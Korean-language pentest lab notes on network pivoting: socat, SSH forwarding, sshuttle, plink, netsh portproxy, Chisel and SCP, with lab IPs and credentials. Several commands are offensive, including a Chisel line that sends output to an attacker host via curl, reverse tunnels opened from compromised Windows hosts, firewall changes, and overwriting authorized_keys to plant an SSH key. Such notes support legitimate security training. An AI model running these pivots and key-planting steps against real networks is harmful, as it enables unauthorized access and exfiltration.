# Network Tunneling and Pivoting

## 개념
- `tunneling`: 데이터를 보낼 수 있는 통로를 만들어 냄
- `port forwarding`: 그 통로를 통해서 어떤 포트를 연결할지 정함

---

## 네트워크 정보 확인
```bash
# 네트워크 인터페이스의 IP 주소 확인
ip addr

# 라우팅 테이블 확인
ip route
```

---

## Port Forwarding with Socat
```bash
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432

socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

**옵션 설명:**
- `-ddd`: 디버그 레벨을 높여 상세 로그 출력
- `TCP-LISTEN:<포트>`: 지정된 포트에서 TCP 연결을 대기
- `fork`: 클라이언트 접속 시 프로세스를 fork 하여 다중 접속 처리
- `TCP:<IP>:<포트>`: 원격 서버와 TCP 연결

---

## SSH Local Port Forwarding

### 내부에서 다른 컴퓨터로 연결
```bash
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

### 내부 컴퓨터로 연결
```bash
ssh -N -L 5901:localhost:5901 commander@192.168.121.55
```

### 포워딩된 포트 사용
```bash
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
```

**옵션 설명:**
- `ssh -N`: 원격 쉘 실행 없이 포트 포워딩만 설정
- `-L [bind_address:]port:host:hostport`: 로컬 포트를 원격 호스트의 특정 포트로 포워딩

---

## SSH Dynamic Port Forwarding

### SOCKS 프록시 생성
```bash
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

### /etc/proxychains4.conf 설정
```bash
socks5 192.168.50.63 9999
```

### Proxychains를 통한 접속
```bash
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

**옵션 설명:**
- `-D [bind_address:]port`: SOCKS 프록시 생성
- `proxychains`: 지정된 프록시를 통해 명령 실행

---

## SSH Remote Port Forwarding

### SSH 서버 시작
```bash
sudo systemctl start ssh
```

### 원격 포트 포워딩
```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

**옵션 설명:**
- `-R [bind_address:]port:host:hostport`: 원격 서버의 포트를 로컬로 포워딩

---

## SSH Remote Dynamic Port Forwarding

### 원격 동적 포워딩 설정
```bash
ssh -N -R 9998 kali@192.168.118.4
```

### Proxychains 설정 확인
```bash
tail /etc/proxychains4.conf

socks5 127.0.0.1 9998
```

---

## sshuttle

### Socat을 통한 SSH 포트 노출
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

### sshuttle로 VPN 유사 터널링
```bash
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

### 터널을 통한 SMB 접속
```bash
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

**옵션 설명:**
- `sshuttle -r <user@host:port> <subnet>`: VPN 유사 터널링

---

## ssh.exe (Windows)

### Kali에서 SSH 서버 시작
```bash
sudo systemctl start ssh
```

### Windows에서 원격 동적 포워딩
```bash
ssh.exe -N -R 9998 kali@192.168.118.4
```

### Proxychains 설정
```bash
tail /etc/proxychains4.conf

socks5 127.0.0.1 9998
```

### PostgreSQL 접속
```bash
proxychains psql -h 10.4.50.215 -U postgres
```

---

## Plink

### Windows에서 리버스 터널링
```powershell
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

### RDP 접속
```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

**옵션 설명:**
- `-ssh`: SSH 프로토콜 사용
- `-l <user>`: 로그인 사용자명
- `-pw <password>`: 비밀번호
- `-R`: 원격 포트 포워딩

---

## Netsh (Windows)

### 포트 프록시 추가
```powershell
netsh interface portproxy add v4tov4 listenport=2222 '
listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

### 방화벽 규칙 추가
```powershell
netsh advfirewall firewall add rule name="port_forward_ssh_2222" '
protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

### SSH 접속
```bash
ssh database_admin@192.168.50.64 -p2222
```

### 설정 제거
```powershell
# 방화벽 규칙 삭제
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"

# 포트 프록시 제거
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

**옵션 설명:**
- `netsh interface portproxy add`: 포트 프록시 추가
- `netsh advfirewall firewall add rule`: 방화벽 규칙 추가
- `delete rule`: 규칙 삭제
- `del v4tov4`: 포트 프록시 제거

---

## Chisel

### 서버 모드
```bash
chisel server --port 8080 --reverse
```

**옵션 설명:**
- `server`: Chisel을 서버 모드로 실행
- `--port 8080`: 서버가 수신 대기할 포트 번호
- `--reverse`: 클라이언트가 리버스 포워딩을 요청할 수 있도록 허용

### 클라이언트 모드 - 포트 포워딩
```bash
chisel client 10.10.14.3:8080 R:80:127.0.0.1:80
```
- `10.10.14.3` : 세션수립
- `R:2000:127.0.0.1:3000` : 서버의 2000포트를 터널링으로 만들고 2000번 포트로 들어오는 패킷을 클라이언트의 3000번 포트로 전달

### 클라이언트 모드 - SOCKS 프록시
```bash
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
```

**옵션 설명:**
- `client <서버주소:포트>`: 지정된 서버에 클라이언트 모드로 접속
- `R:socks`: 서버 측에서 리버스 SOCKS 프록시를 생성 (서버에서 접속할 수 있는 SOCKS 포트가 열림)
- `&> /tmp/output`: 표준 출력과 표준 에러를 `/tmp/output` 파일로 리다이렉트
- `curl --data @/tmp/output <url>`: 실행 결과 로그를 서버로 전송

### SSH와 Chisel SOCKS 프록시 결합
```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```

**옵션 설명:**
- `ssh -o ProxyCommand=...`: SSH 접속 시 프록시 명령어 지정
- `ncat`: netcat의 확장 버전으로 다양한 프록시 지원
- `--proxy-type socks5`: SOCKS5 프로토콜을 사용
- `--proxy 127.0.0.1:1080`: 로컬에서 실행 중인 SOCKS 프록시(Chisel을 통해 생성된 것)
- `%h %p`: SSH가 접속하려는 원격 호스트와 포트로 치환됨
- `database_admin@10.4.50.215`: 최종적으로 접속할 SSH 서버 계정 및 주소

---

## SCP (Secure Copy)
```bash
scp -O -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
```
- `-O` : 최신 scp에서는 SFTP 프로토콜을 사용하는데 예전의 SCP 프로토콜을 사용하도록 설정
